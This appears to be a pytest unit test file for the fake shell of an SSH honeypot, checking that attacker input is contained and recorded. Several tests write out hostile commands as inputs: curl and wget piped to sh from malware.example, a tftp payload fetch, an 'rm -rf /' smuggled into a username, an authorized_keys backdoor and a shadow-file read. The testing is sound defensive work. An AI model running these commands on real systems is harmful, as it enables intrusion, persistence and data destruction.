"""Unit tests for the simulated shell (no network involved)."""

from __future__ import annotations

import pytest

from sshhoneypot.shell import FakeShell
from sshhoneypot.shell.core import MAX_DEPTH
from sshhoneypot.shell.fs import MAX_SESSION_BYTES


@pytest.fixture
def downloads() -> list[tuple[str, str]]:
    return []


@pytest.fixture
def sh(downloads) -> FakeShell:
    return FakeShell(
        hostname="web-prod-01",
        username="root",
        src_ip="203.0.113.9",
        on_download=lambda tool, url: downloads.append((tool, url)),
        clock=lambda: 1_795_000_000.0,
    )


def run(sh: FakeShell, line: str) -> str:
    return sh.run_line(line).output


def test_identity_commands(sh):
    assert run(sh, "whoami") == "root\n"
    assert run(sh, "id") == "uid=0(root) gid=0(root) groups=0(root)\n"
    assert run(sh, "hostname") == "web-prod-01\n"
    assert run(sh, "uname") == "Linux\n"
    assert run(sh, "uname -m") == "x86_64\n"
    assert run(sh, "uname -a").startswith("Linux web-prod-01 6.8.0-49-generic #49-Ubuntu SMP")
    assert sh.prompt() == "root@web-prod-01:~# "


def test_non_root_user():
    sh = FakeShell(hostname="h", username="ubuntu")
    assert run(sh, "id").startswith("uid=1000(ubuntu)")
    assert sh.prompt() == "ubuntu@h:~$ "
    assert "Permission denied" in run(sh, "cat /etc/shadow")
    assert "Permission denied" in run(sh, "ls /root")


def test_hostile_username_is_sanitized_for_the_prompt():
    sh = FakeShell(hostname="h", username="r\x1b[31moot;rm -rf /\n")
    assert "\x1b" not in sh.prompt() and "\n" not in sh.prompt()
    assert sh.user == "r31mootrm-rf"


def test_navigation_and_listing(sh):
    assert run(sh, "pwd") == "/root\n"
    assert run(sh, "cd /var/www/html; pwd") == "/var/www/html\n"
    assert run(sh, "ls") == "index.html\n"
    assert sh.prompt() == "root@web-prod-01:/var/www/html# "
    assert "No such file or directory" in run(sh, "cd /nope")
    assert "Not a directory" in run(sh, "cd /etc/passwd")
    assert run(sh, "cd; pwd") == "/root\n"
    listing = run(sh, "ls -la")
    assert "drwx------ 2 root root" in listing and ".bashrc" in listing
    assert ".bashrc" not in run(sh, "ls")
    assert "cannot access '/x'" in run(sh, "ls /x")


def test_cat_and_proc_files(sh):
    assert "root:x:0:0:root:/root:/bin/bash" in run(sh, "cat /etc/passwd")
    assert run(sh, "cat /etc/hostname") == "web-prod-01\n"
    assert 'PRETTY_NAME="Ubuntu 24.04.1 LTS"' in run(sh, "cat /etc/os-release")
    assert "cat: /nope: No such file or directory" in run(sh, "cat /nope")
    assert "Is a directory" in run(sh, "cat /etc")


def test_pipes_and_filters(sh):
    assert run(sh, "cat /proc/cpuinfo | grep 'model name' | wc -l") == "2\n"
    assert run(sh, "nproc") == "2\n"
    line = run(sh, "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6}'")
    assert line == "Intel(R) Xeon(R) Gold\n"
    assert run(sh, "grep -c processor /proc/cpuinfo") == "2\n"
    assert run(sh, "echo a b c | awk -F ' ' '{print $2}'") == "b\n"
    assert run(sh, "free -m | grep Mem | awk '{print $2}'") == "3921\n"
    assert run(sh, "ps aux | grep nginx | wc -l") == "3\n"


def test_operators(sh):
    assert run(sh, "true && echo yes || echo no") == "yes\n"
    assert run(sh, "false && echo yes || echo no") == "no\n"
    assert run(sh, "echo a; echo b") == "a\nb\n"
    assert run(sh, "uname -a 2>/dev/null >/dev/null; echo ok") == "ok\n"
    assert run(sh, "echo $HOME $USER '$HOME'") == "/root root $HOME\n"
    assert run(sh, "sh -c 'whoami && hostname'") == "root\nweb-prod-01\n"
    assert run(sh, "sudo -u root whoami") == "root\n"


def test_unknown_commands(sh):
    res = sh.run_line("nmap -sS 10.0.0.0/8")
    assert res.output == "nmap: command not found\n"
    assert res.status == 127 and not res.known
    res = sh.run_line("ls; perl -e 'print 1'")
    assert "perl: command not found" in res.output and not res.known
    assert run(sh, "/bin/busybox MIRAI") == "MIRAI: applet not found\n"
    assert run(sh, "./payload") == "-bash: ./payload: No such file or directory\n"


def test_syntax_errors(sh):
    assert "unexpected EOF" in run(sh, "echo 'unterminated")
    assert "syntax error" in run(sh, "| ls")
    assert "syntax error" in run(sh, "ls >")


def test_exit(sh):
    assert sh.run_line("exit").exit
    assert sh.run_line("whoami; logout; whoami").output == "root\n"


def test_redirection_writes_only_to_memory(sh, tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    run(sh, 'echo "ssh-rsa AAAAB3Nza attacker" >> ~/.ssh/authorized_keys')
    run(sh, "echo second >> /root/.ssh/authorized_keys")
    assert run(sh, "cat .ssh/authorized_keys") == "ssh-rsa AAAAB3Nza attacker\nsecond\n"
    run(sh, "echo hi > /tmp/x; cp /tmp/x /tmp/y; mkdir -p /tmp/a/b; touch /tmp/a/b/c")
    assert run(sh, "cat /tmp/y") == "hi\n"
    assert run(sh, "ls /tmp/a/b") == "c\n"
    run(sh, "rm -rf /tmp/a")
    assert "No such file" in run(sh, "ls /tmp/a")
    assert list(tmp_path.iterdir()) == []  # nothing reached the real disk


def test_filesystem_budget(sh):
    chunk = "x" * 4000
    for _ in range(MAX_SESSION_BYTES // 4000 + 2):
        out = run(sh, f"echo {chunk} >> /tmp/big")
    assert "No space left on device" in out
    assert sh.fs.used_bytes <= MAX_SESSION_BYTES


def test_nested_shell_depth_is_bounded(sh):
    line = "whoami"
    for _ in range(MAX_DEPTH + 3):
        line = f"sh -c {line!r}".replace("'", '"') if '"' not in line else f"sh -c '{line}'"
    sh.run_line(line)  # must terminate without recursion errors


def test_downloads_are_reported_not_fetched(sh, downloads):
    out = run(sh, "wget http://malware.example/bot.sh")
    assert "Resolving malware.example (malware.example)... failed" in out
    assert "Connecting to 198.51.100.7:8080... failed" in run(
        sh, "wget -O /tmp/a http://198.51.100.7:8080/a"
    )
    # -S shows the error; it goes to the terminal, not into "sh".
    assert run(sh, "curl -fsSL http://malware.example/x | sh") == (
        "curl: (6) Could not resolve host: malware.example\n"
    )
    assert run(sh, "curl -s http://malware.example/x | sh") == ""
    assert "Could not resolve host: other.example" in run(sh, "curl other.example/p")
    run(sh, "tftp -g -r mips 198.51.100.7")
    assert downloads == [
        ("wget", "http://malware.example/bot.sh"),
        ("wget", "http://198.51.100.7:8080/a"),
        ("curl", "http://malware.example/x"),
        ("curl", "http://malware.example/x"),
        ("curl", "other.example/p"),
        ("tftp", "tftp://198.51.100.7/mips"),
    ]
    assert "No such file" in run(sh, "ls /tmp/a")  # wget did not create the file


def test_grep_never_compiles_attacker_regex(sh):
    # A catastrophic-backtracking pattern is just a fixed string here.
    assert run(sh, "echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaa! | grep '(a+)+$'") == ""


def test_history_and_clear(sh):
    run(sh, "id")
    run(sh, "whoami")
    assert run(sh, "history") == "    1  id\n    2  whoami\n    3  history\n"
    assert run(sh, "clear").startswith("\x1b[H")


def test_output_is_bounded(sh):
    run(sh, "echo " + "y" * 3000 + " > /tmp/y")
    for _ in range(6):
        run(sh, "cat /tmp/y /tmp/y /tmp/y /tmp/y >> /tmp/y")
    res = sh.run_line("cat /tmp/y /tmp/y /tmp/y /tmp/y /tmp/y")
    assert len(res.output) <= 64 * 1024 + 1
